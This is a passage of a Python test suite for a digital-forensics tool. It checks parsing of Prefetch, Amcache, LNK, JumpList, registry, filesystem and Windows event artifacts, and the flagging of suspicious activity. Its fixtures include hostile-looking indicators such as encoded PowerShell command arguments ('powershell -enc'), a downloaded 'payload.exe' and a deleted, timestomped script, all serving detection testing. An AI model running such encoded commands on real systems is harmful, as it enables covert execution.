            "ParserStatus": "partial",
        },
        {"artifact_type": "prefetch", "parser": "prefetch_raw", "source_tool": "native_prefetch", "source_format": "pf", "name": "TOOL.EXE-ABCD1234.pf"},
    )
    assert doc is not None
    assert doc["event"]["type"] == "prefetch_observed"
    assert doc["process"]["name"] == "TOOL.EXE"
    assert doc["process"]["path"] is None
    assert doc["host"]["name"] is None
    assert doc["user"]["name"] is None


def test_prefetch_normalizer_prefers_full_name_from_executable_path() -> None:
    doc = normalize_row(
        "case-1",
        "ev-1",
        "art-1",
        {
            "SourceFile": "C:\\Windows\\Prefetch\\COLLECTOR_VELOCIRAPTOR-V0.76.5-WINDOWS-AMD64.EXE-ABCD1234.pf",
            "ExecutableName": "COLLECTOR_VELOCIRAPTOR-V0.76.",
            "ExecutablePath": "\\VOLUME{01db}\\USERS\\DFIR\\DESKTOP\\COLLECTOR_VELOCIRAPTOR-V0.76.5-WINDOWS-AMD64.EXE",
            "RunCount": 1,
            "LastRun": "2026-05-03T10:38:04.225726+00:00",
            "ParserStatus": "parsed_native",
        },
        {
            "artifact_type": "prefetch",
            "parser": "prefetch_raw",
            "source_tool": "native_prefetch",
            "source_format": "pf",
            "name": "Prefetch raw - COLLECTOR_VELOCIRAPTOR-V0.76.5-WINDOWS-AMD64.EXE-ABCD1234.pf",
            "source_path": "C:\\Windows\\Prefetch\\COLLECTOR_VELOCIRAPTOR-V0.76.5-WINDOWS-AMD64.EXE-ABCD1234.pf",
        },
    )
    assert doc["process"]["name"] == "COLLECTOR_VELOCIRAPTOR-V0.76.5-WINDOWS-AMD64.EXE"
    assert doc["file"]["path"] == "\\VOLUME{01db}\\USERS\\DFIR\\DESKTOP\\COLLECTOR_VELOCIRAPTOR-V0.76.5-WINDOWS-AMD64.EXE"
    assert doc["file"]["name"] == "COLLECTOR_VELOCIRAPTOR-V0.76.5-WINDOWS-AMD64.EXE"
    assert doc["file"]["extension"] == ".exe"


def test_prefetch_search_text_limits_referenced_entries() -> None:
    row = {
        "SourceFile": "C:\\Windows\\Prefetch\\TOOL.EXE-ABCD1234.pf",
        "ExecutableName": "TOOL.EXE",
        "ExecutablePath": "C:\\Tools\\TOOL.EXE",
        "RunCount": 1,
        "LastRun": "2026-05-03T10:38:04.225726+00:00",
        "ReferencedFiles": "|".join(f"C:\\Ref\\file{i}.dll" for i in range(12)),
        "ReferencedDirectories": "|".join(f"C:\\Dir{i}" for i in range(6)),
        "ParserStatus": "parsed_native",
    }
    doc = normalize_row(
        "case-1",
        "ev-1",
        "art-1",
        row,
        {
            "artifact_type": "prefetch",
            "parser": "prefetch_raw",
            "source_tool": "native_prefetch",
            "source_format": "pf",
            "name": "Prefetch raw - TOOL.EXE-ABCD1234.pf",
            "source_path": "C:\\Windows\\Prefetch\\TOOL.EXE-ABCD1234.pf",
        },
    )
    assert "C:\\Ref\\file0.dll" in doc["search_text"]
    assert "C:\\Ref\\file7.dll" in doc["search_text"]
    assert "C:\\Ref\\file8.dll" not in doc["search_text"]
    assert "C:\\Dir0" in doc["search_text"]
    assert "C:\\Dir2" in doc["search_text"]
    assert "C:\\Dir3" not in doc["search_text"]


def test_amcache_raw_candidate_descriptor(monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setattr("app.ingest.raw_parsers.router.amcache_native_available", lambda: True)
    descriptor = describe_raw_candidate("C%3A/Windows/AppCompat/Programs/Amcache.hve", "amcache")
    assert descriptor is not None
    assert descriptor["parser"] == "amcache_raw"
    assert descriptor["source_tool"] == "native_amcache"
    assert descriptor["source_format"] == "registry_hive"


def test_amcache_raw_parser_extracts_inventory_and_execution_candidate(monkeypatch: pytest.MonkeyPatch, tmp_path: Path) -> None:
    ts_program = datetime(2026, 5, 3, 9, 0, tzinfo=UTC)
    ts_file = datetime(2026, 5, 3, 10, 0, tzinfo=UTC)
    program_key = _FakeRegistryKey(
        "Root\\InventoryApplication\\prog-1",
        values={
            "ProgramId": "prog-1",
            "ProgramName": "Contoso Agent",
            "ProgramVersion": "3.4.5",
            "Publisher": "Contoso",
            "ProductName": "Contoso Agent",
            "InstallDate": "2026-05-01T08:15:00Z",
        },
        timestamp=ts_program,
    )
    file_key = _FakeRegistryKey(
        "Root\\InventoryApplicationFile\\file-1",
        values={
            "ProgramId": "prog-1",
            "Path": "C%3A/Users/alex/Downloads/agent.exe",
            "FileName": "agent.exe",
            "SHA1": "1" * 40,
            "SHA256": "a" * 64,
            "LowerCaseLongPath": "C%3A/Users/alex/Downloads/agent.exe",
        },
        timestamp=ts_file,
    )
    roots = {
        "Root\\InventoryApplication": _FakeRegistryKey("Root\\InventoryApplication", subkeys=[program_key]),
        "Root\\Programs": _FakeRegistryKey("Root\\Programs"),
        "Root\\InventoryApplicationFile": _FakeRegistryKey("Root\\InventoryApplicationFile", subkeys=[file_key]),
        "Root\\InventoryDriverBinary": _FakeRegistryKey("Root\\InventoryDriverBinary"),
        "Root\\File": _FakeRegistryKey("Root\\File"),
    }
    fake_module = _FakeRegistryModule()

    class _Registry(_FakeRegistryModule.Registry):
        def __init__(self, _: str):
            super().__init__(_, keys=roots)

    fake_module.Registry = _Registry
    monkeypatch.setattr("app.ingest.raw_parsers.amcache_parser._load_registry_module", lambda: fake_module)
    path = tmp_path / "Amcache.hve"
    path.write_bytes(b"fake")
    result = AmcacheRawParser().parse(
        path,
        case_id="case-1",
        evidence_id="ev-1",
        artifact_id="art-1",
        artifact_meta={"source_path": "C%3A/Windows/AppCompat/Programs/Amcache.hve", "name": "Amcache raw - Amcache.hve"},
    )
    assert result.parser_status == "parsed_native"
    assert len(result.events) == 2
    inventory_doc = next(doc for doc in result.events if doc["event"]["type"] == "installed_program_observed")
    execution_doc = next(doc for doc in result.events if doc["event"]["type"] == "execution_candidate")
    assert inventory_doc["event"]["category"] == "program_inventory"
    assert inventory_doc["@timestamp"] == "2026-05-03T09:00:00+00:00"
    assert inventory_doc["timestamp_precision"] == "amcache_key_last_write"
    assert inventory_doc["execution"]["is_execution_confirmed"] is False
    assert execution_doc["artifact"]["parser"] == "amcache_raw"
    assert execution_doc["source_tool"] == "native_amcache"
    assert execution_doc["source_format"] == "registry_hive"
    assert execution_doc["event"]["action"] == "amcache_execution_candidate_observed"
    assert execution_doc["event"]["category"] == "execution"
    assert execution_doc["process"]["name"] == "agent.exe"
    assert execution_doc["process"]["application"] == "agent.exe"
    assert execution_doc["file"]["path"] == "C:\\Users\\alex\\Downloads\\agent.exe"
    assert execution_doc["file"]["source_path"] == "C%3A/Windows/AppCompat/Programs/Amcache.hve"
    assert execution_doc["execution"]["program_name"] == "agent.exe"
    assert execution_doc["execution"]["confidence"] == "low"
    assert execution_doc["execution"]["is_execution_confirmed"] is False
    assert execution_doc["event"]["type"] != "process_executed"
    assert "amcache_not_execution_proof" in execution_doc["data_quality"]
    assert "user_writable_path" in execution_doc["tags"]
    assert "suspicious_path" in execution_doc["tags"]
    assert result.metadata["records_extracted"] == 2
    assert result.metadata["sample_records"]


def test_amcache_raw_versioned_executable_is_not_double_extension(monkeypatch: pytest.MonkeyPatch, tmp_path: Path) -> None:
    file_key = _FakeRegistryKey(
        "Root\\InventoryApplicationFile\\file-1",
        values={
            "Path": "C%3A/Users/alex/Downloads/windows-kb890830-x64-v5.140.exe",
            "FileName": "windows-kb890830-x64-v5.140.exe",
        },
        timestamp=datetime(2026, 5, 3, 10, 0, tzinfo=UTC),
    )
    roots = {
        "Root\\InventoryApplication": _FakeRegistryKey("Root\\InventoryApplication"),
        "Root\\Programs": _FakeRegistryKey("Root\\Programs"),
        "Root\\InventoryApplicationFile": _FakeRegistryKey("Root\\InventoryApplicationFile", subkeys=[file_key]),
        "Root\\InventoryDriverBinary": _FakeRegistryKey("Root\\InventoryDriverBinary"),
        "Root\\File": _FakeRegistryKey("Root\\File"),
    }
    fake_module = _FakeRegistryModule()

    class _Registry(_FakeRegistryModule.Registry):
        def __init__(self, _: str):
            super().__init__(_, keys=roots)

    fake_module.Registry = _Registry
    monkeypatch.setattr("app.ingest.raw_parsers.amcache_parser._load_registry_module", lambda: fake_module)
    path = tmp_path / "Amcache.hve"
    path.write_bytes(b"fake")
    result = AmcacheRawParser().parse(
        path,
        case_id="case-1",
        evidence_id="ev-1",
        artifact_id="art-1",
        artifact_meta={"source_path": "C%3A/Windows/AppCompat/Programs/Amcache.hve", "name": "Amcache raw - Amcache.hve"},
    )
    document = result.events[0]
    assert document["file"]["name"] == "windows-kb890830-x64-v5.140.exe"
    assert "double_extension" not in set(document["tags"] or [])
    assert "suspicious_path" in set(document["tags"] or [])


def test_amcache_raw_without_timestamp_does_not_use_processed_at(monkeypatch: pytest.MonkeyPatch, tmp_path: Path) -> None:
    file_key = _FakeRegistryKey(
        "Root\\File\\file-1",
        values={"Path": "C:\\Temp\\note.txt", "FileName": "note.txt"},
        timestamp=None,
    )
    roots = {
        "Root\\InventoryApplication": _FakeRegistryKey("Root\\InventoryApplication"),
        "Root\\Programs": _FakeRegistryKey("Root\\Programs"),
        "Root\\InventoryApplicationFile": _FakeRegistryKey("Root\\InventoryApplicationFile"),
        "Root\\InventoryDriverBinary": _FakeRegistryKey("Root\\InventoryDriverBinary"),
        "Root\\File": _FakeRegistryKey("Root\\File", subkeys=[file_key]),
    }
    fake_module = _FakeRegistryModule()

    class _Registry(_FakeRegistryModule.Registry):
        def __init__(self, _: str):
            super().__init__(_, keys=roots)

    fake_module.Registry = _Registry
    monkeypatch.setattr("app.ingest.raw_parsers.amcache_parser._load_registry_module", lambda: fake_module)
    path = tmp_path / "Amcache.hve"
    path.write_bytes(b"fake")
    result = AmcacheRawParser().parse(
        path,
        case_id="case-1",
        evidence_id="ev-1",
        artifact_id="art-1",
        artifact_meta={"source_path": "C:\\Windows\\AppCompat\\Programs\\Amcache.hve", "name": "Amcache raw - Amcache.hve"},
    )
    doc = result.events[0]
    assert doc["@timestamp"] is None
    assert doc["timestamp_precision"] == "unknown"
    assert doc["timezone"] is None
    assert doc["event"]["timeline_include"] is False
    assert "missing_timestamp" in doc["data_quality"]
    assert doc["ingest"]["processed_at"]


def test_prefetch_normalizer_prioritizes_prefetch_raw_over_evtxecmd_name() -> None:
    doc = normalize_row(
        "case-1",
        "ev-1",
        "art-1",
        {
            "SourceFile": "C:\\Windows\\Prefetch\\EVTXECMD.EXE-C066B9B5.pf",
            "ExecutableName": "EVTXECMD.EXE",
            "ExecutablePath": "C:\\Tools\\EvtxECmd\\EvtxECmd.exe",
            "RunCount": 1,
            "LastRun": "2026-05-03T10:38:04.225726+00:00",
            "Version": 31,
            "Signature": "SCCA",
            "ParserStatus": "parsed_native",
        },
        {
            "artifact_type": "prefetch",
            "parser": "prefetch_raw",
            "source_tool": "native_prefetch",
            "source_format": "pf",
            "name": "Prefetch raw - EVTXECMD.EXE-C066B9B5.pf",
            "source_path": "C:\\Windows\\Prefetch\\EVTXECMD.EXE-C066B9B5.pf",
        },
    )
    assert doc is not None
    assert doc["artifact"]["type"] == "prefetch"
    assert doc["event"]["category"] == "execution"
    assert doc["event"]["type"] == "process_executed"
    assert doc["process"]["name"] == "EVTXECMD.EXE"


def test_prefetch_raw_detection_from_velociraptor_collection(tmp_path: Path) -> None:
    pf_dir = tmp_path / "uploads" / "triage" / "C%3A" / "Windows" / "Prefetch"
    pf_dir.mkdir(parents=True)
    pf_path = pf_dir / "CHROME.EXE-D999B1B4.pf"
    pf_path.write_bytes(_build_minimal_prefetch_bytes())
    discovery = discover_velociraptor_evidences(tmp_path)
    candidate = next(item for item in discovery.candidates if item.artifact_type == "prefetch_raw")
    assert candidate.supported is True
    assert candidate.parser_status == "parsed_native"
    assert candidate.executable_name_guess == "CHROME.EXE"
    assert candidate.prefetch_hash_guess == "D999B1B4"


def test_amcache_raw_detection_from_velociraptor_collection_preserves_companions(monkeypatch: pytest.MonkeyPatch, tmp_path: Path) -> None:
    monkeypatch.setattr("app.ingest.raw_parsers.router.amcache_native_available", lambda: True)
    amcache_dir = tmp_path / "uploads" / "triage" / "C%3A" / "Windows" / "AppCompat" / "Programs"
    amcache_dir.mkdir(parents=True)
    (amcache_dir / "Amcache.hve").write_bytes(b"fake")
    (amcache_dir / "Amcache.hve.LOG1").write_bytes(b"log1")
    (amcache_dir / "Amcache.hve.LOG2").write_bytes(b"log2")
    (amcache_dir / "Amcache.hve.idx").write_bytes(b"idx")
    (amcache_dir / "Amcache.hve.LOG1.idx").write_bytes(b"log1idx")
    (amcache_dir / "Amcache.hve.LOG2.idx").write_bytes(b"log2idx")
    discovery = discover_velociraptor_evidences(tmp_path)
    candidate = next(item for item in discovery.candidates if item.artifact_type == "amcache")
    assert candidate.category == "amcache"
    assert candidate.supported is True
    assert candidate.parser_status == "parsed_native"
    assert set(candidate.companion_files) == {
        "uploads/triage/C%3A/Windows/AppCompat/Programs/Amcache.hve.LOG1",
        "uploads/triage/C%3A/Windows/AppCompat/Programs/Amcache.hve.LOG2",
        "uploads/triage/C%3A/Windows/AppCompat/Programs/Amcache.hve.idx",
        "uploads/triage/C%3A/Windows/AppCompat/Programs/Amcache.hve.LOG1.idx",
        "uploads/triage/C%3A/Windows/AppCompat/Programs/Amcache.hve.LOG2.idx",
    }
    assert not any(item.original_path.lower().endswith(("amcache.hve.log1", "amcache.hve.log2", "amcache.hve.idx", "amcache.hve.log1.idx", "amcache.hve.log2.idx")) for item in discovery.candidates)


def test_semi_auto_includes_prefetch_and_correlates_with_evtx() -> None:
    from app.analysis import semi_auto as semi_auto_module

    prefetch_event = {
        "id": "pref-1",
        "event_id": "pref-1",
        "case_id": "case-1",
        "evidence_id": "ev-1",
        "artifact_id": "art-pref",
        "@timestamp": "2026-05-03T10:00:00+00:00",
        "host": {"name": "MOVISTAR-PC"},
        "user": {"name": None},
        "event": {"type": "program_execution", "message": "Prefetch execution evidence: POWERSHELL.EXE", "severity": "medium"},
        "process": {"name": "powershell.exe", "path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "command_line": None, "parent_name": None},
        "execution": {"source": "prefetch", "run_count": 4, "last_run": "2026-05-03T10:00:00+00:00", "last_runs": ["2026-05-02T10:00:00+00:00"], "confidence": "high"},
        "windows": {"event_id": None, "channel": None, "provider": None},
        "tags": ["prefetch", "execution", "powershell", "lolbin"],
        "suspicious_reasons": ["Execution of LOLBin: powershell.exe"],
        "source_file": "PECmd_Output.csv",
    }
    evtx_event = {
        "id": "evtx-1",
        "event_id": "evtx-1",
        "case_id": "case-1",
        "evidence_id": "ev-1",
        "artifact_id": "art-evtx",
        "@timestamp": "2026-05-03T10:04:00+00:00",
        "host": {"name": "MOVISTAR-PC"},
        "user": {"name": "alex"},
        "event": {"type": "process_creation", "message": "Process created: powershell.exe", "severity": "medium"},
        "process": {"name": "powershell.exe", "path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "command_line": "powershell.exe -enc aQ==", "parent_name": "cmd.exe"},
        "execution": {"source": "evtx"},
        "windows": {"event_id": 4688, "channel": "Security", "provider": "Microsoft-Windows-Security-Auditing", "event_data": {}},
        "tags": ["execution", "powershell"],
        "suspicious_reasons": [],
        "source_file": "EvtxECmd_Output.csv",
    }

    original_iter = semi_auto_module.iter_case_events
    semi_auto_module.iter_case_events = lambda case_id, query=None: [prefetch_event, evtx_event]  # type: ignore[assignment]
    try:
        analysis = build_case_semi_auto_analysis("case-1")
    finally:
        semi_auto_module.iter_case_events = original_iter  # type: ignore[assignment]

    assert analysis["summary"]["program_executions"] >= 1
    assert analysis["summary"]["powershell_executions"] >= 1
    assert analysis["sections"]["program_executions"][0]["key_fields"]["source"] in {"prefetch", "evtx"}
    assert any("prefetch" in ",".join(item["evidence_refs"]).lower() for item in analysis["sections"]["program_executions"])
    assert any(item["summary"] == "PowerShell execution observed via Prefetch" or "powershell" in item["summary"].lower() for item in analysis["sections"]["powershell"])


def test_semi_auto_includes_lnk_sections_and_correlates() -> None:
    from app.analysis import semi_auto as semi_auto_module

    lnk_event = {
        "id": "lnk-1",
        "event_id": "lnk-1",
        "case_id": "case-1",
        "evidence_id": "ev-1",
        "artifact_id": "art-lnk",
        "@timestamp": "2026-05-03T10:00:00+00:00",
        "host": {"name": "MOVISTAR-PC"},
        "user": {"name": "alex"},
        "event": {"type": "program_or_script_opened", "message": "LNK target accessed: C:\\Users\\alex\\Downloads\\runme.ps1", "severity": "medium"},
        "file": {"path": "C:\\Users\\alex\\Downloads\\runme.ps1", "extension": ".ps1", "name": "runme.ps1"},
        "lnk": {"source_file": "C:\\Users\\alex\\Desktop\\runme.lnk", "arguments": "powershell -enc aQ==", "working_directory": "C:\\Users\\alex\\Downloads", "machine_id": "MOVISTAR-PC"},
        "volume": {"drive_type": "Fixed", "serial": None},
        "network": {"path": None},
        "process": {"name": None, "path": None, "command_line": None},
        "windows": {"event_id": None, "channel": None, "provider": None},
        "tags": ["lnk", "file_access", "script", "suspicious", "powershell"],
        "suspicious_reasons": ["LNK arguments contain PowerShell encoded command"],
        "source_file": "LECmd_Output.csv",
    }
    evtx_event = {
        "id": "evtx-1",
        "event_id": "evtx-1",
        "case_id": "case-1",
        "evidence_id": "ev-1",
        "artifact_id": "art-evtx",
        "@timestamp": "2026-05-03T10:05:00+00:00",
        "host": {"name": "MOVISTAR-PC"},
        "user": {"name": "alex"},
        "event": {"type": "process_creation", "message": "Process created: powershell.exe", "severity": "medium"},
        "process": {"name": "powershell.exe", "path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "command_line": "powershell.exe -File C:\\Users\\alex\\Downloads\\runme.ps1", "parent_name": "explorer.exe"},
        "execution": {"source": "evtx"},
        "windows": {"event_id": 4688, "channel": "Security", "provider": "Microsoft-Windows-Security-Auditing", "event_data": {}},
        "tags": ["execution", "powershell"],
        "suspicious_reasons": [],
        "source_file": "EvtxECmd_Output.csv",
    }
    unc_event = {
        "id": "lnk-2",
        "event_id": "lnk-2",
        "case_id": "case-1",
        "evidence_id": "ev-1",
        "artifact_id": "art-lnk",
        "@timestamp": "2026-05-03T11:00:00+00:00",
        "host": {"name": "MOVISTAR-PC"},
        "user": {"name": "alex"},
        "event": {"type": "document_opened", "message": "LNK target accessed: \\\\SERVER\\Share\\doc.docx", "severity": "low"},
        "file": {"path": "\\\\SERVER\\Share\\doc.docx", "extension": ".docx", "name": "doc.docx"},
        "lnk": {"source_file": "C:\\Users\\alex\\Desktop\\share.lnk", "machine_id": "MOVISTAR-PC"},
        "volume": {"drive_type": "Removable", "serial": "ABCD"},
        "network": {"path": "\\\\SERVER\\Share\\doc.docx"},
        "process": {"name": None, "path": None, "command_line": None},
        "windows": {"event_id": None, "channel": None, "provider": None},
        "tags": ["lnk", "file_access", "network_path", "unc_path", "removable_media"],
        "suspicious_reasons": ["LNK target uses UNC path"],
        "source_file": "LECmd_Output.csv",
    }

    original_iter = semi_auto_module.iter_case_events
    semi_auto_module.iter_case_events = lambda case_id, query=None: [lnk_event, evtx_event, unc_event]  # type: ignore[assignment]
    try:
        analysis = build_case_semi_auto_analysis("case-1")
    finally:
        semi_auto_module.iter_case_events = original_iter  # type: ignore[assignment]

    assert analysis["sections"]["opened_files"]
    assert analysis["sections"]["scripts_opened"]
    assert analysis["sections"]["network_paths"]
    assert analysis["sections"]["removable_media"]
    assert any(item["key_fields"].get("lnk_target_path") == "C:\\Users\\alex\\Downloads\\runme.ps1" for item in analysis["sections"]["program_executions"])
    assert any("PowerShell" in item["title"] or "powershell" in item["summary"].lower() for item in analysis["sections"]["powershell"])


def test_semi_auto_includes_jumplist_sections_and_application_usage() -> None:
    from app.analysis import semi_auto as semi_auto_module

    jumplist_event = {
        "id": "jl-1",
        "event_id": "jl-1",
        "case_id": "case-1",
        "evidence_id": "ev-1",
        "artifact_id": "art-jl",
        "@timestamp": "2026-05-03T10:00:00+00:00",
        "host": {"name": "MOVISTAR-PC"},
        "user": {"name": "alex"},
        "artifact": {"type": "jumplist"},
        "event": {"type": "program_or_script_opened", "message": "JumpList target accessed: C:\\Users\\alex\\Downloads\\runme.ps1", "severity": "medium"},
        "file": {"path": "C:\\Users\\alex\\Downloads\\runme.ps1", "extension": ".ps1", "name": "runme.ps1"},
        "jumplist": {
            "source_file": "C:\\Users\\alex\\AppData\\Roaming\\Microsoft\\Windows\\Recent\\AutomaticDestinations\\powershell.automaticDestinations-ms",
            "app_name": "Windows PowerShell",
            "app_id": "powershell.exe",
            "arguments": "powershell -enc aQ==",
            "interaction_count": 3,
            "machine_id": "MOVISTAR-PC",
            "effective_path": "C:\\Users\\alex\\Downloads\\runme.ps1",
            "effective_path_source": "local_path",
        },
        "volume": {"drive_type": "Fixed", "serial": None},
        "network": {"path": None},
        "process": {"name": None, "path": None, "command_line": None},
        "windows": {"event_id": None, "channel": None, "provider": None},
        "tags": ["jumplist", "file_access", "script", "suspicious", "powershell"],
        "suspicious_reasons": ["JumpList arguments contain PowerShell encoded command"],
        "source_file": "JLECmd_Output.csv",
    }
    lnk_event = {
        "id": "lnk-1",
        "event_id": "lnk-1",
        "case_id": "case-1",
        "evidence_id": "ev-1",
        "artifact_id": "art-lnk",
        "@timestamp": "2026-05-03T10:05:00+00:00",
        "host": {"name": "MOVISTAR-PC"},
        "user": {"name": "alex"},
        "artifact": {"type": "lnk"},
        "event": {"type": "program_or_script_opened", "message": "LNK target accessed: C:\\Users\\alex\\Downloads\\runme.ps1", "severity": "medium"},
        "file": {"path": "C:\\Users\\alex\\Downloads\\runme.ps1", "extension": ".ps1", "name": "runme.ps1"},
        "lnk": {"source_file": "C:\\Users\\alex\\Desktop\\runme.lnk", "arguments": "powershell -enc aQ==", "working_directory": "C:\\Users\\alex\\Downloads", "machine_id": "MOVISTAR-PC"},
        "volume": {"drive_type": "Fixed", "serial": None},
        "network": {"path": None},
        "process": {"name": None, "path": None, "command_line": None},
        "windows": {"event_id": None, "channel": None, "provider": None},
        "tags": ["lnk", "file_access", "script", "suspicious", "powershell"],
        "suspicious_reasons": ["LNK arguments contain PowerShell encoded command"],
        "source_file": "LECmd_Output.csv",
    }

    original_iter = semi_auto_module.iter_case_events
    semi_auto_module.iter_case_events = lambda case_id, query=None: [jumplist_event, lnk_event]  # type: ignore[assignment]
    try:
        analysis = build_case_semi_auto_analysis("case-1")
    finally:
        semi_auto_module.iter_case_events = original_iter  # type: ignore[assignment]

    assert analysis["sections"]["opened_files"]
    assert analysis["sections"]["scripts_opened"]
    assert analysis["sections"]["applications_used"]
    assert any(item["key_fields"].get("app_name") == "Windows PowerShell" for item in analysis["sections"]["applications_used"])
    assert any(item["key_fields"].get("source") == "jlecmd" for item in analysis["sections"]["opened_files"])
    assert any("jlecmd" in (item.get("key_fields", {}) or {}).get("correlated_sources", []) or item["key_fields"].get("source") == "jlecmd" for item in analysis["sections"]["scripts_opened"])


def test_semi_auto_includes_registry_sections() -> None:
    from app.analysis import semi_auto as semi_auto_module

    registry_docs = normalize_file(
        "case-1",
        "ev-1",
        "art-1",
        Path(__file__).parent / "fixtures" / "recmd_sample.csv",
        {"artifact_type": "registry", "name": "recmd_sample.csv", "source_path": "recmd_sample.csv", "parser": "zimmerman"},
    )
    original_iter = semi_auto_module.iter_case_events
    semi_auto_module.iter_case_events = lambda case_id, query=None: registry_docs  # type: ignore[assignment]
    try:
        analysis = build_case_semi_auto_analysis("case-1")
    finally:
        semi_auto_module.iter_case_events = original_iter  # type: ignore[assignment]

    assert analysis["sections"]["persistence"]
    assert analysis["sections"]["usb_devices"]
    assert analysis["sections"]["rdp"]
    assert analysis["sections"]["user_activity"]
    assert analysis["sections"]["suspicious_findings"]
    assert any(item["key_fields"].get("type") == "run_key" for item in analysis["sections"]["persistence"])
    assert any(item["key_fields"].get("vendor") == "SanDisk" for item in analysis["sections"]["usb_devices"])


def test_semi_auto_includes_filesystem_sections() -> None:
    from app.analysis import semi_auto as semi_auto_module

    created_event = {
        "id": "usn-1",
        "event_id": "usn-1",
        "case_id": "case-1",
        "evidence_id": "ev-1",
        "artifact_id": "art-usn",
        "@timestamp": "2026-05-03T15:00:00+00:00",
        "artifact": {"type": "usn"},
        "host": {"name": "MOVISTAR-PC"},
        "user": {"name": "alex"},
        "event": {"category": "filesystem", "type": "file_created", "message": "USN file created: C:\\Users\\alex\\Downloads\\payload.exe", "severity": "medium"},
        "file": {"path": "C:\\Users\\alex\\Downloads\\payload.exe", "name": "payload.exe", "extension": ".exe", "parent_path": "C:\\Users\\alex\\Downloads", "size": None},
        "filesystem": {"source": "usn", "activity": "file_created", "reason": "FILE_CREATE", "is_deleted": False, "timestomp_suspected": False},
        "usn": {"reason": "FILE_CREATE", "usn": "12345"},
        "tags": ["filesystem", "usn", "file_created", "executable", "suspicious_path"],
        "suspicious_reasons": ["Executable in suspicious path: C:\\Users\\alex\\Downloads\\payload.exe"],
        "source_file": "MFTECmd_Output.csv",
    }
    deleted_event = {
        "id": "mft-1",
        "event_id": "mft-1",
        "case_id": "case-1",
        "evidence_id": "ev-1",
        "artifact_id": "art-mft",
        "@timestamp": "2026-05-03T15:05:00+00:00",
        "artifact": {"type": "mft"},
        "host": {"name": "MOVISTAR-PC"},
        "user": {"name": "alex"},
        "event": {"category": "file", "type": "file_deleted", "message": "Deleted MFT entry observed: C:\\Users\\Public\\evil.ps1", "severity": "medium"},
        "file": {"path": "C:\\Users\\Public\\evil.ps1", "name": "evil.ps1", "extension": ".ps1", "deleted": True, "in_use": False, "parent_path": "C:\\Users\\Public"},
        "filesystem": {"source": "mft", "activity": "file_deleted", "is_deleted": True, "timestomp_suspected": True},
        "mft": {"entry_number": "43", "sequence_number": "8"},
        "tags": ["filesystem", "mft", "deleted_candidate", "script", "timestomp_suspected", "suspicious"],
        "suspicious_reasons": ["MFT timestamp anomaly", "MFT possible timestomping"],
        "source_file": "MFTECmd_Output.csv",
    }

    original_iter = semi_auto_module.iter_case_events
    semi_auto_module.iter_case_events = lambda case_id, query=None: [created_event, deleted_event]  # type: ignore[assignment]
    try:
        analysis = build_case_semi_auto_analysis("case-1")
    finally:
        semi_auto_module.iter_case_events = original_iter  # type: ignore[assignment]

    assert analysis["sections"]["file_creations"]
    assert analysis["sections"]["file_deletions"]
    assert analysis["sections"]["execution_candidates"]
    assert analysis["sections"]["suspicious_files"]
    assert any(item["key_fields"].get("file_path") == "C:\\Users\\alex\\Downloads\\payload.exe" for item in analysis["sections"]["file_creations"])
    assert any("timestomp" in " ".join(item.get("suspicious_reasons", [])).lower() for item in analysis["sections"]["suspicious_findings"])
    assert not analysis["sections"]["rdp"]


def test_invalid_username_is_rejected() -> None:
    assert not is_valid_username("User=alex")
    assert not is_valid_username("RenderedMessage, too long")
    assert extract_user_from_path("C:\\Users\\alex\\Desktop\\test.txt") == "alex"


def test_windows_mapping_examples() -> None:
    assert classify_windows_event(4624, {"Channel": "Security", "Provider": "Microsoft-Windows-Security-Auditing"}).event_type == "logon_success"
    assert "source_mismatch" in classify_windows_event(4625, {}).tags
    assert classify_windows_event(7045, {"Channel": "System", "Provider": "Service Control Manager"}).category == "persistence"
    assert classify_windows_event(4698, {"Channel": "Security", "Provider": "Microsoft-Windows-Security-Auditing"}).event_type == "scheduled_task_created"
    assert classify_windows_event(4104, {"Channel": "Microsoft-Windows-PowerShell/Operational", "Provider": "Microsoft-Windows-PowerShell"}).severity == "medium"
    assert classify_windows_event(9999, {}).category == "windows_event"


def test_windows_mapping_propagates_source_family() -> None:
    classification = classify_windows_event(
        4104,
        {
            "Channel": "Microsoft-Windows-PowerShell/Operational",
            "Provider": "Microsoft-Windows-PowerShell",
        },
    )
    assert classification.source_family == "powershell"


def test_event_catalog_validates_4624_source() -> None:
    match = classify_windows_event_catalog(4624, "Microsoft-Windows-Security-Auditing", "Security")
    assert match.event_type == "logon_success"
    assert match.source_match is True


def test_event_catalog_marks_4625_source_mismatch() -> None:
    match = classify_windows_event_catalog(4625, "Microsoft-Windows-EventSystem", "Application")
    assert match.event_type == "event_id_4625"
    assert "source_mismatch" in match.tags
    assert match.source_match is False


def test_event_catalog_1102_uses_eventlog_provider() -> None:
    match = classify_windows_event_catalog(1102, "Microsoft-Windows-Eventlog", "Security")
    assert match.event_type == "audit_log_cleared"
    assert match.category == "anti_forensics"


def test_event_catalog_7045_service_control_manager() -> None:
    match = classify_windows_event_catalog(7045, "Service Control Manager", "System")
    assert match.event_type == "service_created"


def test_event_catalog_1149_rdp_remote_connection_manager() -> None:
    match = classify_windows_event_catalog(1149, "Microsoft-Windows-TerminalServices-RemoteConnectionManager", "Microsoft-Windows-TerminalServices-RemoteConnectionManager/Operational")
    assert match.event_type == "rdp_authentication_success"


def test_payload_json_data_single_dict_extracts() -> None:
    payload = json.dumps({"EventData": {"Data": {"@Name": "TargetUserName", "#text": "SYSTEM"}}})
    path = Path(__file__).parent / "fixtures" / "payload-single.csv"
    _write_evtx_payload_csv(path, 4624, json.loads(payload))
    doc = normalize_file("case-1", "ev-1", "art-1", path, {"artifact_type": "evtx", "name": path.name, "source_path": str(path), "parser": "zimmerman"})[0]
    assert doc["windows"]["event_data"]["TargetUserName"] == "SYSTEM"
    path.unlink()


def test_payload_json_user_data_extracts() -> None:
    path = Path(__file__).parent / "fixtures" / "payload-userdata.csv"
    payload = {"UserData": {"SomeProviderData": {"FieldA": "ValueA"}}}
    _write_evtx_payload_csv(path, 5857, payload, Channel="Microsoft-Windows-WMI-Activity/Operational", Provider="Microsoft-Windows-WMI-Activity")
    doc = normalize_file("case-1", "ev-1", "art-1", path, {"artifact_type": "evtx", "name": path.name, "source_path": str(path), "parser": "zimmerman"})[0]
    assert doc["windows"]["event_data"]["FieldA"] == "ValueA"
    path.unlink()


def test_evtxecmd_fixture_integration_counts_and_mismatch() -> None:
    fixture = Path(__file__).parent / "fixtures" / "evtxecmd_sample.csv"
